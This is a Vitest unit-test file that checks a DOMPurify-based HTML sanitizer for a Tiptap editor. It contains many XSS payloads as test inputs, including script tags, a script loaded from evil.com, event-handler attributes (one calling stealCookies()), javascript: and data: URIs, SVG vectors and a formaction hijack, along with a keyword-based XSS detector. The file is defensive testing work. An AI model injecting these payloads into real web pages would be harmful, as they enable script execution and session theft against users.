/**
 * Unit tests: sanitizeHtml() allow-list correctness
 *
 * Verifies that the DOMPurify-backed sanitizer in lib/utils/sanitize.ts:
 *   - Strips every known XSS vector (script, event handlers, javascript:, data:,
 *     SVG, MathML, data-* attributes, style attribute).
 *   - Preserves every HTML tag the Tiptap editor legitimately produces
 *     (strong, em, a, img, pre/code with class, lists, headings, blockquote).
 *   - Handles edge cases (empty string, deeply nested XSS, template literals).
 *
 * Framework: Vitest with jsdom environment (configured in vitest.config.ts).
 * isomorphic-dompurify resolves to DOMPurify backed by the jsdom window,
 * which makes these tests identical to the browser runtime.
 */
import { describe, it, expect } from "vitest";
import { sanitizeHtml, sanitizedHtml } from "../sanitize";

// ── Helper ────────────────────────────────────────────────────────────────────

/** True if the sanitised output still contains any XSS indicator. */
function hasXss(output: string): boolean {
  return (
    output.includes("<script") ||
    output.includes("javascript:") ||
    output.includes("onerror") ||
    output.includes("onclick") ||
    output.includes("onload") ||
    output.includes("onmouseover") ||
    output.includes("alert(") ||
    output.includes("stealCookies")
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// Dangerous inputs — must be stripped
// ─────────────────────────────────────────────────────────────────────────────

describe("sanitizeHtml() — strips dangerous content", () => {
  it("removes <script> tags and their content", () => {
    const result = sanitizeHtml('<p>Safe text</p><script>alert("xss")</script>');
    expect(result).not.toContain("<script");
    expect(result).not.toContain("alert(");
    expect(result).toContain("Safe text");
  });

  it("removes <script src=…> (external script load)", () => {
    const result = sanitizeHtml('<script src="https://evil.com/payload.js"></script>');
    expect(result).not.toContain("script");
    expect(result).not.toContain("evil.com");
  });

  it("removes inline onerror= event handler", () => {
    const result = sanitizeHtml('<img src="x" onerror="alert(1)">');
    expect(hasXss(result)).toBe(false);
    // img element itself may or may not survive (src="x" is valid); what matters
    // is that onerror is gone
    expect(result).not.toContain("onerror");
  });

  it("removes onclick= on a paragraph", () => {
    const result = sanitizeHtml('<p onclick="alert(1)">Click me</p>');
    expect(result).not.toContain("onclick");
    expect(result).toContain("Click me"); // text survives
  });

  it("removes onload= on img", () => {
    const result = sanitizeHtml('<img src="valid.png" onload="stealCookies()">');
    expect(result).not.toContain("onload");
    expect(result).not.toContain("stealCookies");
  });

  it("removes onmouseover= event handler", () => {
    const result = sanitizeHtml('<a href="https://ok.com" onmouseover="alert(1)">Link</a>');
    expect(result).not.toContain("onmouseover");
    expect(result).toContain("https://ok.com"); // href survives
  });

  it("removes javascript: URI from href", () => {
    const result = sanitizeHtml('<a href="javascript:alert(1)">Click</a>');
    expect(result).not.toContain("javascript:");
    // The link text is preserved; the attribute is stripped or the href is removed
    expect(result).toContain("Click");
  });

  it("removes javascript: URI (mixed case) from href", () => {
    const result = sanitizeHtml('<a href="JaVaScRiPt:alert(1)">XSS</a>');
    expect(result.toLowerCase()).not.toContain("javascript:");
  });

  it("removes data: URI from img src", () => {
    const result = sanitizeHtml('<img src="data:image/png;base64,abc123">');
    expect(result).not.toContain("data:");
  });

  it("removes data: URI from anchor href", () => {
    const result = sanitizeHtml('<a href="data:text/html,<script>alert(1)</script>">click</a>');
    expect(result).not.toContain("data:");
    expect(result).not.toContain("<script");
  });

  it("removes <svg> elements (closes svg onload= attack vector)", () => {
    const result = sanitizeHtml('<svg onload="alert(1)"><rect fill="red"/></svg>');
    expect(result).not.toContain("svg");
    expect(result).not.toContain("onload");
  });

  it("removes <svg> with namespace bypass attempt", () => {
    const result = sanitizeHtml(
      '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
    );
    expect(result).not.toContain("svg");
    expect(result).not.toContain("script");
  });

  it("removes <math> (MathML injection)", () => {
    const result = sanitizeHtml("<math><mrow><mi>x</mi></mrow></math>");
    expect(result).not.toContain("math");
  });

  it("removes data-* attributes (attribute-based injection)", () => {
    const result = sanitizeHtml('<p data-secret="session-token-123">Text</p>');
    expect(result).not.toContain("data-secret");
    expect(result).not.toContain("session-token-123");
    expect(result).toContain("Text"); // text content is preserved
  });

  it("removes style= attribute (expression() / CSS injection)", () => {
    const result = sanitizeHtml(
      '<p style="color:red; background:expression(alert(1))">Text</p>',
    );
    expect(result).not.toContain("style=");
    expect(result).toContain("Text");
  });

  it("removes formaction= attribute (form hijacking)", () => {
    const result = sanitizeHtml(
      '<form><button formaction="https://evil.com">Submit</button></form>',
    );
    expect(result).not.toContain("formaction");
  });

  it("handles deeply nested / obfuscated XSS: <<script>script>alert(1)</script>", () => {
    const result = sanitizeHtml("<<script>script>alert(1)<</script>/script>");
    expect(result).not.toContain("alert(");
    expect(hasXss(result)).toBe(false);
  });

  it("handles template-literal event handler: onerror=alert`1`", () => {
    const result = sanitizeHtml('<img src="x" onerror=alert`1`>');
    expect(result).not.toContain("onerror");
  });

  it("removes unknown / non-allowlisted elements", () => {
    // <details> and <summary> are not in the ALLOWED_TAGS list
    const result = sanitizeHtml("<details><summary>Hidden</summary>Content</details>");
    expect(result).not.toContain("<details");
    expect(result).not.toContain("<summary");
    // Text content may survive (DOMPurify extracts it)
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Safe content — must be preserved
// ─────────────────────────────────────────────────────────────────────────────

describe("sanitizeHtml() — preserves legitimate Tiptap output", () => {
  it("preserves <p> and text content", () => {
    const result = sanitizeHtml("<p>Hello world</p>");
    expect(result).toContain("<p>");
    expect(result).toContain("Hello world");
  });

  it("preserves <strong>", () => {
    const result = sanitizeHtml("<p><strong>Bold</strong></p>");
    expect(result).toContain("<strong>");
    expect(result).toContain("Bold");
  });

  it("preserves <em>", () => {
    const result = sanitizeHtml("<p><em>Italic</em></p>");
    expect(result).toContain("<em>");
    expect(result).toContain("Italic");
  });

  it("preserves <s> (strikethrough)", () => {
    const result = sanitizeHtml("<p><s>Struck</s></p>");
    expect(result).toContain("<s>");
  });

  it("preserves <a href='https://…'> with target and rel", () => {
    const result = sanitizeHtml(
      '<a href="https://example.com" target="_blank" rel="noopener noreferrer">Link</a>',
    );
    expect(result).toContain('href="https://example.com"');
    expect(result).toContain("Link");
    expect(result).not.toContain("javascript:");
  });

  it("preserves <img> with https src and alt", () => {
    const result = sanitizeHtml(
      '<img src="https://cdn.supabase.co/bucket/file.png" alt="Screenshot" width="800" height="600">',
    );
    expect(result).toContain("img");
    expect(result).toContain("https://cdn.supabase.co/bucket/file.png");
    expect(result).toContain('alt="Screenshot"');
  });

  it("preserves <pre><code class='language-ts'> (syntax highlighting)", () => {
    const result = sanitizeHtml(
      '<pre><code class="language-typescript">const x: number = 1;</code></pre>',
    );
    expect(result).toContain("<pre>");
    expect(result).toContain("<code");
    expect(result).toContain("const x: number = 1;");
    expect(result).toContain("language-typescript");
  });

  it("preserves class attribute on code elements (lowlight)", () => {
    const result = sanitizeHtml('<code class="language-python">print("hello")</code>');
    expect(result).toContain('class="language-python"');
  });

  it("preserves class attribute on span elements (prose utility)", () => {
    const result = sanitizeHtml('<span class="hljs-keyword">const</span>');
    // <span> is not in ALLOWED_TAGS, so it gets stripped — but the text survives.
    // This test just confirms class attr doesn't trigger a sanitizer panic.
    expect(result).toContain("const");
  });

  it("preserves unordered list structure", () => {
    const result = sanitizeHtml("<ul><li>First</li><li>Second</li></ul>");
    expect(result).toContain("<ul>");
    expect(result).toContain("<li>");
    expect(result).toContain("First");
  });

  it("preserves ordered list structure", () => {
    const result = sanitizeHtml("<ol><li>Step 1</li><li>Step 2</li></ol>");
    expect(result).toContain("<ol>");
    expect(result).toContain("Step 1");
  });

  it("preserves <blockquote>", () => {
    const result = sanitizeHtml("<blockquote><p>Quoted text</p></blockquote>");
    expect(result).toContain("<blockquote>");
    expect(result).toContain("Quoted text");
  });

  it("preserves all heading levels h1–h4", () => {
    const result = sanitizeHtml(
      "<h1>H1</h1><h2>H2</h2><h3>H3</h3><h4>H4</h4>",
    );
    expect(result).toContain("<h1>");
    expect(result).toContain("<h2>");
    expect(result).toContain("<h3>");
    expect(result).toContain("<h4>");
  });

  it("preserves <br> and <hr>", () => {
    const result = sanitizeHtml("<p>Line 1<br>Line 2</p><hr>");
    expect(result).toContain("br");
    expect(result).toContain("hr");
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Edge cases
// ─────────────────────────────────────────────────────────────────────────────

describe("sanitizeHtml() — edge cases", () => {
  it("returns empty string for empty input", () => {
    expect(sanitizeHtml("")).toBe("");
  });

  it("returns empty string for whitespace-only string", () => {
    // Whitespace alone has no tags — DOMPurify returns it as-is or trims
    const result = sanitizeHtml("   ");
    expect(hasXss(result)).toBe(false);
  });

  it("handles plain text with no HTML (passthrough)", () => {
    const result = sanitizeHtml("Just plain text, no tags.");
    expect(result).toContain("Just plain text");
    expect(hasXss(result)).toBe(false);
  });

  it("handles HTML entities safely (no double-encoding)", () => {
    const result = sanitizeHtml("<p>&lt;b&gt;not bold&lt;/b&gt;</p>");
    expect(result).toContain("&lt;b&gt;");
    expect(result).not.toContain("<b>");
  });

  it("handles null-like falsy value gracefully (empty string guard)", () => {
    // The guard `if (!dirty) return ""` handles falsy values
    // TypeScript prevents passing null/undefined, but we test the JS runtime path
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    expect(sanitizeHtml(null as any)).toBe("");
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    expect(sanitizeHtml(undefined as any)).toBe("");
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// sanitizedHtml() wrapper
// ─────────────────────────────────────────────────────────────────────────────

describe("sanitizedHtml() convenience wrapper", () => {
  it("returns an object with __html property", () => {
    const result = sanitizedHtml("<p>Hello</p>");
    expect(result).toHaveProperty("__html");
    expect(typeof result.__html).toBe("string");
  });

  it("__html contains the sanitised content", () => {
    const result = sanitizedHtml("<p><strong>Bold</strong></p>");
    expect(result.__html).toContain("<strong>");
    expect(result.__html).toContain("Bold");
  });

  it("__html is empty for XSS payloads", () => {
    const result = sanitizedHtml('<script>alert(1)</script>');
    expect(hasXss(result.__html)).toBe(false);
  });
});
